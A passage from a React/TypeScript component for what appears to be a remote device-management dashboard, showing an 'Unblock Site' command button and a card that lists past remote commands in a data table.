              <CmdButton icon={<CheckCircle />} label="Unblock Site" description="Restore site access" variant="success" pending={!!pending["unblock_website"]} onClick={() => setUnblockSiteDlg(true)} />
            </div>
          </CardContent>
        </Card>

        {/* Command History */}
        <Card className="border shadow-sm">
          <CardHeader className="pb-0">
            <CardTitle className="text-lg flex items-center gap-2">
              <Clock className="h-5 w-5 text-slate-500" /> Command History
            </CardTitle>
          </CardHeader>
          <DataTable<RemoteCommand>
            data={history}
            columns={historyColumns}
            isLoading={isHistoryLoading}
            searchable={false}
          />
        </Card>
      </div>
    </>
  )
}
